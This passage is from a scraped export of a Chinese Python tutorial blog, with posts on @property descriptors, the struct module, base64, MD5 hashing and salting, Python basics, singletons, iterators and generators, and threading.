delx(self): del self._x x = property(getx, setx, delx, \u0026#34;I\u0026#39;m the \u0026#39;x\u0026#39; property.\u0026#34;) Decorators make defining new properties or modifying existing ones easy: class C(object): @property def x(self): \u0026#34;I am the \u0026#39;x\u0026#39; property.\u0026#34; return self._x @x.setter def x(self, value): self._x = value @x.deleter def x(self): del self._x \u0026#34;\u0026#34;\u0026#34; 实现 首先要明确的是，property 是一个类装饰器！setter、getter、deleter都是这个类的方法！\n实现代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 class MyProperty(object): def __init__(self, fget=None, fset=None, fdel=None, doc=None): self.__fget = fget self.__fset = fset self.__fdel = fdel self.__doc__ = doc def __get__(self, instance, owner): return self.__fget(instance) def __set__(self, instance, value): # 判断是否设置了setter方法 if self.__fset is None: raise AttributeError(\u0026#34;this attribute is read-only\u0026#34;) self.__fset(instance, value) def __delete__(self, instance): # 判断是否设置了deleter方法 if self.__fdel is None: raise AttributeError(\u0026#34;this attribute cannot delete\u0026#34;) self.__fdel(instance) def getter(self, func): self.__fget = func return self def setter(self, func): self.__fset = func return self def deleter(self, func): self.__fdel = func return self 示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 class Student(object): def __init__(self): self.__age = 18 @MyProperty def age(self): return self.__age @age.setter def age(self, value): self.__age = value @age.deleter def age(self): del self.__age john = Student() print(john.age) john.age = 15 print(john.age) del john.age __get、__set______、__delete__ 都是属性描述符的方法\n初始化\n当我们初始化类时，被装饰的方法（age）传递给 MyProperty 描述符，实例会保存传递来的方法，并返回一个 MyProperty 的实例，实例的名字和方法名一样。\ngraph LR D --\u0026gt; | age 方法 |B[MyProperty] B --\u0026gt; | 保存 age 方法|C[创建 age 实例] C --\u0026gt; | 返回 age 实例 |D[Student] 当我们调用 john.age 时，实际上调用的是 MyProperty 的实例，然后实例再调用初始化类时保存的方法，再将被调用的方法的返回值返回给 john.age，这样就达到了像调用属性一样调用方法的效果。\ngraph LR A[调用 john.age ] --\u0026gt; B[ 调用 __get__ 方法 ] B[调用 保存的 age 方法] --\u0026gt; D[返回 age方法返回的值] ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-@property-%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90%E5%8F%8A%E5%AE%9E%E7%8E%B0/","title":"Python学习之路 —— @property 原理剖析及实现"},{"content":"Python学习之路——struct 模块使用 用途 按照指定格式将 Python 数据类型转换为字节流； 按照指定格式将字节流转换为 Python 数据类型； 解析 C 语言中的结构体； 内置函数 函数 返回值 功能 pack(fmt, *args) string 按照指定格式(fmt)，将数据(*args)转换成字节流，返回字节流 pack_into(fmt, buffer, offset, *args) None 按照给定的格式(fmt)，将数据(*args)转换成字节流，并将字节流写入以 offset (起始位)开始的 buffer unpack(fmt, string) tuple 按照给定的格式(fmt)解析字节流(string),并返回解析结果 unpack_from(fmt, buffer, offset=0) tuple 按照给定的格式(fmt)解析以 offset (起始位置) 开始的缓冲区(buffer)，并返回解析结果 calcsize(fmt) int 计算给定的格式(fmt)占用内存大小 格式化字符串 字节对齐 由于 C语言 在不同硬件设备上采用的对齐方式不同，因此我们在解析数据流时要考虑字节对齐的问题：\nCharacter Byte order Size Alignment @(默认) 本机 本机 本机,凑够4字节 = 本机 标准 none,按原字节数 \u0026lt; 小端 标准 none,按原字节数 \u0026gt; 大端 标准 none,按原字节数 ! network(大端) 标准 none,按原字节数 类型转换 格式符 C语言类型 Python类型 Standard size x pad byte(填充字节) no value c char string of length 1 1 b signed char integer 1 B unsigned char integer 1 ? _Bool bool 1 h short integer 2 H unsigned short integer 2 i int integer 4 I(大写的i) unsigned int integer 4 l(小写的L) long integer 4 L unsigned long long 4 q long long long 8 Q unsigned long long long 8 f float float 4 d double float 8 s char[] string p char[] string P void * long 例程 从字节流解析数据 1 2 3 4 5 6 7 8 9 10 struct data { char name[20]; float capacity; float Electricity; int status; }; struct demo data{\u0026#39;Hello\u0026#39;, 1.2, 1.2, 1}; // 将结构体转换为字节流的结果为：b\u0026#39;Hello\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00?\\x99\\x99\\x9a?\\x99\\x99\\x9a\\x00\\x00\\x00\\x01\u0026#39; 1 2 3 4 5 6 import struct data = b\u0026#39;Hello\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00?\\x99\\x99\\x9a?\\x99\\x99\\x9a\\x00\\x00\\x00\\x01\u0026#39; data = struct.unpack(\u0026#39;\u0026lt;20sid\u0026#39;, data) # data为 C程序传递来的字节流 print(data) # (b\u0026#39;Hello\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39;, 1.2000000476837158, 1.2000000476837158, 1) 数据封装为字节流 1 2 3 4 5 import struct data = struct.pack(\u0026#39;\u0026gt;20sffi\u0026#39;, \u0026#39;Hell\u0026#39;.encode(\u0026#39;ascii\u0026#39;), 1.2, 1.2, 1) print(data) # b\u0026#39;Hello\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00?\\x99\\x99\\x9a?\\x99\\x99\\x9a\\x00\\x00\\x00\\x01\u0026#39; ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-struct%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/","title":"Python学习之路 —— struct模块使用"},{"content":"Python 学习之路——Base64 编码 一、base64简介 Base64是网络上最常见的用于传输 8Bit字节码 的编码方式之一，它就是一种基于64个可打印字符来表示二进制数据的方法（RFC2045～RFC2049上有MIME的详细规范）。\nBase64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。\n标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的 “/”和“+” 字符变为形如 “%XX” 的形式。 而这些“%”号在存入数据库时还需要再进行转换，因为在SQL语句中将 “%” 号用作通配符。 为解决此问题，可采用一种用于URL的改进Base64编码，它在 末尾填充\u0026rsquo;=\u0026lsquo;号，并将标准 Base64 中的 “+”和“/”分别改成了“-”和“_” ，这样就免去了在URL编解码和数据库存储时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。\n二、加密过程 Base64要求把每三个8Bit的字节转换为四个6Bit的字节（3 * 8 = 4 * 6 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1/3。 例子：\n转换前：10101101, 10111010, 01110110, 10111010 第一步先将字符按每6位进行分割： 101011, 011011, 101001, 110110, 101110, 10 第二步在分割后字符进行添0： 00101011, 00011011, 00101001, 00110110, 00101110, 00000010 第三步进行查表转换成字符串： r b p 2 u C 第四步判断字符个数添加\u0026#39;=\u0026#39;： (每四个一组，不足的添加\u0026#39;=\u0026#39;) r b p 2 u C = = 三、Python代码实现 在Python中内置模块 base64可以实现 base64 编码。\n1 2 3 4 5 6 7 import base64 s = \u0026#39;我爱 Python\u0026#39; b = base64.b64encode(s.encode()) print(b) # b\u0026#39;5oiR54ixIFB5dGhvbg==\u0026#39; c = base64.b64decode(b).decode() print(c) # 我爱 Python ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFbase64%E7%BC%96%E7%A0%81/","title":"Python学习之路——base64编码"},{"content":"Python 学习之路——MD5 加密 一、MD5简介 MD5（MD5 Message-Digest Algorithm），中文名称第五代信息摘要算法，它是一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。 MD5的特性：\n压缩性： 任意长度的数据，算出的MD5值长度都是固定的。 容易计算： 从原数据计算出MD5值很容易。 抗修改性： 对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。 弱抗碰撞： 已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。 强抗碰撞： 想找到两个不同的数据，使它们具有相同的MD5值，是非常困难的。 MD5的应用：\n用户密码 请求参数校验 文件校验 二、实现 MD5 算法的过程分为四步：处理原文，设置初始值，循环加工，拼接结果。 第一步： 首先计算出原文长度(bit)对 512 求余的结果，如果不等于 448，就需要填充原文使得原文对 512 求余的结果等于 448。填充的方法是第一位填充 1，其余位填充 0。填充完后，信息的长度就是 512*N+448。\n之后，用剩余的位置（512-448=64 位）记录原文的真正长度，把长度的二进制值补在最后。这样处理后的信息长度就是 512*(N+1)。 第二步: MD5 的哈希结果长度为 128 位，按每 32 位分成一组共 4 组。这 4 组结果是由 4 个初始值 A、B、C、D 经过不断演变得到。MD5 的官方实现中，A、B、C、D 的初始值如下（16 进制）：\nA=0x01234567 B=0x89ABCDEF C=0xFEDCBA98 D=0x76543210 第三步： 这一步是最复杂的一步，大概流程就是将ABCD进行循环，每一次循环都会让旧的 ABCD 产生新的 ABCD，然后再用新的 ABCD再去循环（具体细节不展开）。 循环的次数是由处理后的原文长度决定的： 假设处理后的原文长度是 M\n主循环次数 = M / 512 每个主循环中包含 512 / 32 * 4 = 64 次 子循环\n第四步: 这一步就很简单了，把循环加工最终产生的 A，B，C，D 四个值拼接在一起转换成字符串。\n更详细的过程请参考：链接\n三、破解MD5 首先要明白，所谓的“破解”并不是使用密文推算出明文，这在理论上是不可能的。\n山东大学王小云院士在2004成功破解 MD5，她的成果也不是通过 MD5 的散列值逆向推算出明文。实际上，王小云的研究成果为，给定消息 M1，能够计算获取 M2，使得 M2 产生的散列值与 M1 产生的散列值相同，即MD5(M1)=MD5(M2)。\n可参看王小云院士提交的报告： 《Collisions for Hash Functions MD4, MD5, HAVAL-128 and RIPEMD 》\n在网络上使用的破解都是使用 碰撞 的方法实现由密文得到原文。 举例来说，假设我们得到一个 md5 的密文，我们可以先将一些常用密码使用 md5 加密，然后与我们之前得到的 md5 密文进行比较，如果两个密文相同，我们就可以知道密码了。理论上只要你的密码库足够大，你破解密码的成功率就足够高。 作为用户来说，在设置密码时，尽量不使用常用密码，作为开发者来说，我们可以对用户密码进行 加盐操作，我们将用户密码与一个我们要加的 ‘盐’ 拼接在一起，只要’盐‘不被知道，我们的密码就很难被 撞库破解。\n四、代码实现 在Python中内置模块 hashlib 中可以实现 md5 加密，在该模块中还可以实现 sha1 的加密：\n1 2 3 4 5 6 from hashlib import md5 s = md5() s.update(\u0026#39;我爱 Python\u0026#39;.encode()) s.update(\u0026#39;Salt\u0026#39;.encode()) # 加盐操作 print(s.hexdigest()) # aeeb02d8a54ade8469e419c8a8f9d8b8 md5类 的 update() 方法是添加字符串而不是覆盖字符串，因此对于数据量较大时的加密我们可以使用多次 update 计算的方法。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AFmd5%E5%8A%A0%E5%AF%86/","title":"Python学习之路——MD5加密"},{"content":"Python 学习之路——编程基础知识 一、计算机语言 1.计算机语言的基本概念 计算机语言（Computer Language）指的是人与计算机之间通信的方式。 不同的计算机语言之间有着不同的语法规则。\n2.高级语言的分类 面向对象的语言：以对象为核心，将对象的行为与属性封装成类。例：Python，Java等。 面向过程的语言：以函数为核心，将需要完成的任务分成各个最简子任务，将子任务封装成函数，在程序中通过调用一个一个函数来完成任务。例：C语言。\n强类型语言：不同类型变量之间不能直接操作。例：Python。 弱类型语言：不同类型变量之间可以直接操作。例：VB，PHP。\n静态型语言：编写程序时需要在函数开头对所用变量进行声明，程序运行时对变量的类型检查是在运行前的编译阶段。静态型语言便于后期代码的维护。例：Java。 动态型语言：在编写程序时不需要在程序开头对变量进行声明。利用动态型语言编写的程序会在程序运行过程中对变量进行类型检查，于是经常出现程序运行到一半报错的情况。动态型语言减少了开发的难度，但是后期维护时有一定的困难。例：Python。\n编译型语言：编译型语言写的程序运行时由编译器处理，然后直接生成计算机可以直接识别的二进制程序，因此编译性语言的运行速度较快。但由于不同的操作系统情况下变量所占字节不同，因此编译性语言所写的程序跨平台性较差。例：C语言。 解释型语言：解释型语言编写的程序运行时先运行翻译成中间代码，再由解释器对中间代码进行解释运行。由于程序只有在运行时才翻译成机器语言，并且每一次运行都要重新解释，因此解释型语言的运行效率比编译型语言慢。但是解释性语言因为有着完备的平台支持，它的跨平台性比编译性语言优秀的多。\n二、Python 1.Python简介 Python是一款易于学习且功能强大的编程语言。它具有高效率的数据结构，能够简单又有效地实现面向对象编程。Python 简洁的语法与动态输入之特性，加之其解释性语言的本质，使得它成为一种在多种领域与绝大多数平台都能进行脚本编写与应用快速开发工作的理想语言。\n2.Python的诞生 Python语言的创始人是来自荷兰的Guido van Rossum。1989年圣诞节期间，在阿萨姆特丹，Guido为了打发圣诞节的无趣，决心开发一个新的脚本解释程序，作为ABC语言的一种继承。之所以选中Python（大蟒蛇的意思）作为该编程语言的名字，是因为他是一个叫Monty Python的喜剧团体的爱好者。\n3.Python的特点 Python的语法十分简单，可读性极高，和英语差不多。其极高的可读性让它变得易于学习。零基础小白建议可以将Python作为第一门编程语言进行学习。Python是自由且开源的，谁都可以给它做贡献，在Python社区里来自全世界的编程爱好者一起为Python的发展共同努力。它的跨平台性和可嵌入性很好，并且它有着丰富的库，这些库可以让开发者轻而易举地实现很多功能。“Life is short I use Python！“，这就是对Python最美的赞誉。\n4.Python的强大 \t软件开发 \t科学运算 \t自动化运维 \t云计算 \tWEB开发 \t网络爬虫 \t人工智能\n5.Python之禅 ​```import this The Zen of Python, by Tim Peters Beautiful is better than ugly. Explicit is better than implicit. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren\u0026#39;t special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you\u0026#39;re Dutch. Now is better than never. Although never is often better than *right* now. If the implementation is hard to explain, it\u0026#39;s a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let\u0026#39;s do more of those! 译文： 翻译： 美胜于丑陋（Python 以编写优美的代码为目标） 明了胜于晦涩（优美的代码应当是明了的，命名规范，风格相似） 简洁胜于复杂（优美的代码应当是简洁的，不要有复杂的内部实现） 复杂胜于凌乱（如果复杂不可避免，那代码间也不能有难懂的关系，要保持接口简洁） 扁平胜于嵌套（优美的代码应当是扁平的，不能有太多的嵌套） 间隔胜于紧凑（优美的代码有适当的间隔，不要奢望一行代码解决问题） 可读性很重要（优美的代码是可读的） 即便假借特例的实用性之名，也不可违背这些规则（这些规则至高无上） 不要包容所有错误，除非你确定需要这样做（精准地捕获异常） 当存在多种可能，不要尝试去猜测而是尽量找一种，最好是唯一一种明显的解决方案（如果不确定，就用穷举法） 虽然这并不容易，因为你不是 Python 之父（这里的 Dutch 是指 Guido ） 做也许好过不做，但不假思索就动手还不如不做（动手之前要细思量） 如果你无法向人描述你的方案，那肯定不是一个好方案；反之亦然（方案测评标准） 命名空间是一种绝妙的理念，我们应当多加利用（倡导与号召）\n三、Python环境搭建 1.Python解释器 Python的解释器分类: CPython(官方) 用C语言编写的Python解释器 PyPy 用Python编写的解释器 IronPython 用.net编写的Python解释器 JPython 用Java编写的Python解释器\n2.Python解释器安装 首先到Python官网下载合适的解释器安装包（最好选择Python3的版本，Python2官方在2020年1月1日便开始停止更新）。 3.Python的两种模式 \t交互模式： \t脚本模式（开发者来编写程序的模式）： 4.PyCharm安装与配置 在PyCharm的官网下载安装包，一般选择社区版。 PyCharm的常规配置： 1.主题的修改 File-settings-apperance-theme 2.代码字体(控制台)的修改 File -\u0026gt; settings -\u0026gt; Editer -\u0026gt; Font 3.关闭更新 File -\u0026gt; settings -\u0026gt; Appearance Behavior -\u0026gt; System Settings -\u0026gt; Updates 4.快捷键的修改 File -\u0026gt; settings -\u0026gt; Keymap 5.添加API文档悬浮提示 File -\u0026gt; settings -\u0026gt; Editer -\u0026gt; General 6.自动导包 File -\u0026gt; settings -\u0026gt; Editer -\u0026gt; General -\u0026gt; Auto Import 7.禁止自动打开上次工程 File-settings -\u0026gt; Appearance Behavior -\u0026gt; System Settings 8.添加头部文件 Editer-Code Style -\u0026gt; File and Code Templates 9.修改字体编码 Editer-Code Style -\u0026gt; File Encodings\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"Python学习之路——编程基础知识"},{"content":"Python 学习之路——单例模式 一、定义： 单例模式（Singleton Pattern）是最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。 这种模式涉及到一个单一的类，该类负责创建自己的对象，同时确保只有单个对象被创建。这个类提供了一种访问其唯一的对象的方式，可以直接访问，不需要实例化该类的对象。\n二、举例： 中国的婚姻制度其实就是一个活生生的单例模式。在你和一位女性结婚时，你需要去民政局登记（实例化）。当你还想要像封建时代那样再找一个老婆时，你去民政局时就没法登记结婚（无法创建新的实例），并且民政局还会告诉你你的合法妻子是谁（返回最先创建的实例对象）。 Windows 的任务管理器也是一种典型的单例模式。我们知道当我们打开多个任务管理器窗口（实例化），它们显示的内容完全一致的。 如果每打开一个窗口就创建一个对象，对象之间又是一模一样的。那这些就是重复对象，就造成了内存的浪费；相反，如果两个窗口的内容不一致（创建了不同的实例），那就会至少有一个窗口展示的内容是错误的，会给用户造成误解。因此实际上在打开多个任务管理器窗口时，展现的都是同一个实例对象。 如果我们在一个项目中的多个地方都需要读取同一份配置文件。如果每次使用都是导入重新创建实例，读取文件，用完后再销毁，这样做的话，就造成不必要的IO浪费，可以使用单例模式只生成一份配置在内存中。 三、代码实现： 思路： 第一次成功创建实例，利用容器保存这个实例； 后面创建实例时，返回容器中的这个实例，不另外创建实例。\n1. 加载模块实现 1 2 3 4 class Singleton(object): pass demo = Singleton() singleton.py\n1 from singleton import demo 在Python中，模块只加载一次，因此只会创建一次实例。\n2. __new__方法实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class User: _instance = None # 储存类的实例 def __new__(cls, *args, **kwargs): # 创建实例之前调用 print(\u0026#39;Implement ...\u0026#39;) if not cls._instance: # 判断类是否是第一次创建实例 print(\u0026#34;Create examples\u0026#34;) cls._instance = super().__new__(cls) # 创建实例 return cls._instance # 返回唯一实例 def __init__(self): print(\u0026#39;Initialization\u0026#39;) a = User() b = User() print(a is b) # True 3. 装饰器实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 instances = {} # 存储类的唯一实例 def Singleton(cls): def get_instance(*args, **kw): cls_name = cls.__name__ # 获得类的名字 if not cls_name in instances: # 判断类是否是第一次创建实例 instance = cls(*args, **kw) # 创建实例 instances[cls_name] = instance # 将类和实例存进字典 return instances[cls_name] return get_instance @Singleton class User: _instance = None def __init__(self): print(\u0026#39;Initialization\u0026#39;) a = User() b = User() print(a is b) # True 4. 元类实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class MetaSingleton(type): def __call__(cls, *args, **kwargs): # __call__方法控制实例的生成 print(\u0026#39;Implement ...\u0026#39;) # 创建实例时首先执行元类的此方法 if not hasattr(cls, \u0026#34;_instance\u0026#34;): # 判断类中是否有“_instance”属性，如果有说明不是第一次创建 print(\u0026#34;Create examples\u0026#34;) cls._instance = super().__call__() # 创建实例 return cls._instance # 返回第一次创建的实例 class User(metaclass=MetaSingleton): def __init__(self): print(\u0026#39;Initialization\u0026#39;) a = User() b = User() print(a is b) # True 四、并发场景下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import time import threading class User: _instance = None def __new__(cls, *args, **kwargs): if not cls._instance: time.sleep(1) cls._instance = super().__new__(cls) return cls._instance def __init__(self): pass def task(): u = User() print(u) for i in range(10): t = threading.Thread(target=task) t.start() 结果： \u0026lt;main.User object at 0x000001A9FF387A88\u0026gt; \u0026lt;main.User object at 0x000001A9FF30CF08\u0026gt; \u0026lt;main.User object at 0x000001A9FF30F948\u0026gt; \u0026lt;main.User object at 0x000001A9FF305588\u0026gt; \u0026lt;main.User object at 0x000001A9FF305C48\u0026gt; \u0026lt;main.User object at 0x000001A9FF30F948\u0026gt; \u0026lt;main.User object at 0x000001A9FF305C48\u0026gt; \u0026lt;main.User object at 0x000001A9FF305588\u0026gt; \u0026lt;main.User object at 0x000001A9FF305C48\u0026gt; \u0026lt;main.User object at 0x000001A9FF30F948\u0026gt;\n在上面的代码中，当我们开启十个线程创建单例时出现了问题。结果是创建了十个对象而非一个。\n原因： 因为在一个对象创建的过程中，另外一个对象也创建了。在它判断的时候，会先去获取类的_instance属性。因为这个时候进入等待，没有创建实例对象。因此每一个线程都会创建一个实例对象，故创建了十次实例对象。 究其原因是速度不匹配引发的资源问题，当延时越小时创建的对象越少。\n解决办法 可以用加锁的方式来解决这个问题。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import time import threading def task(): u = User() print(u) def synchronized(func): func.__lock__ = threading.Lock() def lock_func(*args, **kwargs): with func.__lock__: return func(*args, **kwargs) return lock_func class User: _instance = None @synchronized def __new__(cls, *args, **kwargs): if not cls._instance: time.sleep(1) cls._instance = super().__new__(cls) return cls._instance def __init__(self): pass if __name__ == \u0026#39;__main__\u0026#39;: for i in range(10): t = threading.Thread(target=task) t.start() 五、优缺点 优点： 数据同步 减少内存占用 缺点： 全局变量，维护应当小心 没有抽象层，拓展不便 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/","title":"Python学习之路——单例模式"},{"content":"Python 学习之路——迭代器与生成器 一、迭代 定义： 迭代是重复反馈过程的活动，其目的通常是为了逼近所需目标或结果。\n在前面的学习中，我们知道 list、tuple、str 等这些对象是可以用 for 循环进行遍历的，这种遍历的方式我们就称之为迭代。能够进行迭代行为的对象我们就称之为可迭代对象（Iterable）。 我们可以用Python的内置模块来判断一个对象是不是可迭代对象：\n1 2 3 4 5 6 7 from collections.abc import Iterable print(isinstance(\u0026#39;Python\u0026#39;, Iterable)) # True print(isinstance([1, 2], Iterable)) # True print(isinstance((1, ), Iterable)) # True print(isinstance({1:1}, Iterable)) # True print(isinstance({1}, Iterable)) # True 通过代码验证，我们之前常用的字符串、列表、元组、字典和集合都属于可迭代对象。\n二、迭代器 在Python中，我们可以自定义迭代器。想要定义迭代器，那么我们就需要在我们的类中添加 __iter__() 与 __next__() 这两个魔法方法。 __iter__() 方法：返回一个特殊的迭代器对象； __next__() 方法：调用next() 函数时调用此方法。 下面我们就用迭代器来实现输出斐波那契数列：\n斐波那契数列：1、1、2、3、5、8、13、21、34\u0026hellip;\u0026hellip;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 class Demo: def __iter__(self): self.a = 0 self.b = 1 return self def __next__(self): self.a, self.b = self.b, self.a + self.b return self.a num = Demo() myiter = iter(num) print(next(myiter)) # 1 print(next(myiter)) # 1 print(next(myiter)) # 2 print(next(myiter)) # 3 使用上面的代码我们成功实现了利用迭代器输出斐波那契数列。\n迭代器的优点： 为什么在Python中我们有那么多的可迭代的容器我们却还要弄一个迭代器呢？像列表、元组等这些容器都能够实现迭代输出，为什么我们还需要自定义迭代器呢？ 首先我们思考一个问题，如果我们要遍历输出 1~100000 的数字，我们用列表怎样输出呢？我们可以用列表推导式——[i for i in range(100000)]，像这样就可以输出。但是这样有一个问题，那就是这样使用时Python解释器会将整个列表放入到内存中，这庞大的数据量必定会占用极大的内存空间。 首先就会拖累程序的运行速度，而且很有可能会产生内存溢出的风险。这就是列表的坏处。 但是如果我们使用迭代器输出，就不会有这种风险了。因为迭代器是调用的函数，输出一次调用一次函数。因此迭代器消耗的内存始终是固定的，不会有内存溢出的风险。 因此在数据较为庞大时我们应当采用迭代器输出。\n三、生成器 定义： 在Python中，使用了 yield 的函数被称为生成器（generator）\n生成器函数跟普通函数不同的是，生成器是一个返回迭代器的函数，只能用于迭代操作，更简单点理解生成器就是一个迭代器。 在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值（这里和return类似）, 并在下一次执行 next() 方法时从当前位置继续运行。\n用列表推导式创建生成器 创建列表和生成器的区别仅在于最外层的 [] 和 ()，[]创建的是一个列表，而 () 创建的是一个生成器。\n1 2 3 4 a = (i for i in range(10)) print(next(a)) # 0 print(next(a)) # 1 print(next(a)) # 2 自定义生成器 利用生成器来实现输出斐波那契数列：\n1 2 3 4 5 6 7 8 9 10 11 def Fibonacci(): a, b, counter = 0, 1, 0 while True: yield a a, b = b, a + b counter += 1 f = Fibonacci() # f 是一个迭代器，由生成器返回生成 print(next(f)) # 0 print(next(f)) # 1 print(next(f)) # 2 生成器和迭代器极为相似，生成器也像迭代器那样有着占据内存空间少的优点，同样适合在数据量较为庞大时使用。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E8%BF%AD%E4%BB%A3%E5%99%A8%E4%B8%8E%E7%94%9F%E6%88%90%E5%99%A8/","title":"Python学习之路——迭代器与生成器"},{"content":"Python 学习之路——多线程 一、线程 1. 定义 进程可以简单的理解为一个可以独立运行的程序单位，它是线程的集合，进程就是有一个或多个线程构成的。而线程是进程中的实际运行单位，是操作系统进行运算调度的最小单位。可理解为线程是进程中的一个最小运行单元。\n2. 解释器 Python 解释器的主要作用是将我们在 .py 文件中写好的代码交给机器去执行，比较常见的解释器包括如下几种：\nCPython：官方解释器，我们从官网下载安装后获得的就是这个解释器，它使用 C 语言开发，是使用范围最广泛的 Python 解释器。 Jython：由 Java 编写，它可以将 Python 代码编译成 Java 字节码，再由 JVM 执行对应的字节码。 IronPython：与 Jython 类似，它由 C# 编写，是运行在 .Net 平台上的解释器。 IPython：基于 CPython 的一个交互式解释器，它主要增强了 CPython 的交互方式。 PyPy：采用了 JIT 技术，它是一个关注执行速度的 Python 解释器，该解释器可以明显提升 Python 代码的执行速度。 3. GIL GIL（global interpreter lock）即全局解释器锁。GIL就是一把锁，当有多个线程时，只有拿到这把锁的线程能够执行Python代码。 在CPython 解释器中，通过GIL机制来确保同一时刻只有一个线程执行 Python 代码的。这样做十分方便的帮助 CPython 解决了并发访问的线程安全问题，但却牺牲了在多处理器上的并行性。因此，CPython 解释器下的多线程并不是真正意义上的多线程。 GIL在以前是完全没有问题的，因为当时的计算机性能还十分落后；但是现在计算机的硬件性能已经发展十分迅速，完全可以实现多个线程并发执行。因此现在GIL反而成了制约Python并发的一堵墙。 但是为什么现在没有去掉GIL呢？这是因为Python的历史已经很久了，如果现在去掉GIL的话，以前很多依靠Python的程序都需要重新架构，这是一项十分庞大的工程。因此现在依然还没有去掉GIL。\n二、threading模块 Python的标准库提供了两个模块：_thread和threading。 在Python2.x的版本里，多线程使用的都是thread模块，thread模块在Python3.x的版本中已经废除，为了程序的兼容性，Python3将thread模块重命名为_thread。 threading模块对_thread进行了封装。绝大多数情况下，我们只需要使用threading这个模块。\n1. 方法属性 active_count() -\u0026gt; int：返回当前存活的线程类 Thread 对象的数量。返回的计数等于 enumerate() 返回的列表长度。 enumerate() -\u0026gt; List[Thread]：以列表形式返回当前所有存活的 Thread 对象。该列表包含守护线程、current_thread() 创建的虚拟线程对象和主线程，不包含已终结的线程和尚未开始的线程。 current_thread() -\u0026gt; Thread：返回当前对应调用者的控制线程的 Thread 对象。如果调用者的控制线程不是利用 threading 创建，会返回一个功能受限的虚拟线程对象。 get_ident() -\u0026gt; int：返回当前线程的线程标识符，它是一个非零的整数。它的值没有直接含义，主要是用作 magic cookie，比如作为含有线程相关数据的字典的索引。线程标识符可能会在线程退出，新线程创建时被复用。 threading.main_thread() -\u0026gt; Thread：返回主 Thread 对象。 settrace(func: _TF) -\u0026gt; None：为所有 threading 模块开始的线程设置追踪函数。每个线程的 run() 方法被调用前，func会被传递给 sys.settrace() 。 setprofile(func: _PF) -\u0026gt; None：为所有 threading 模块开始的线程设置性能测试函数。在每个线程的 run() 方法被调用前，func 会被传递给 sys.setprofile() 。 stack_size(size: int = ...) -\u0026gt; int：返回创建线程时用的堆栈大小（size可指定之后新建的线程的堆栈大小，在0~32768[32kb]之间）。 TIMEOUT_MAX: float：阻塞函数中形参 timeout 允许的最大值。 2. 线程对象（Thread） Thread类可用来创建线程对象。 参数：\ngroup: None：为了日后扩展 ThreadGroup 类实现而保留 target: Optional[Callable[..., Any]]：用于 run() 方法调用的可调用对象（如函数等） name: Optional[str]：线程名称。默认情况下为 \u0026ldquo;Thread-N\u0026rdquo; 格式 args: Iterable：用于调用目标函数的参数元组 kwargs: Mapping[str, Any]：用于调用目标函数的关键字参数字典 daemon: Optional[bool]：设置线程是否为守护模式。默认为None，守护模式 补充——守护模式与非守护模式： 守护线程：守护线程会随主线程的退出而退出。即使当时正在执行任务，如果主线程退出了的话守护线程会立即停止并退出。这有可能会导致资源不能被正确释放的的问题（如：已经打开的文档等）。 非守护线程：Python 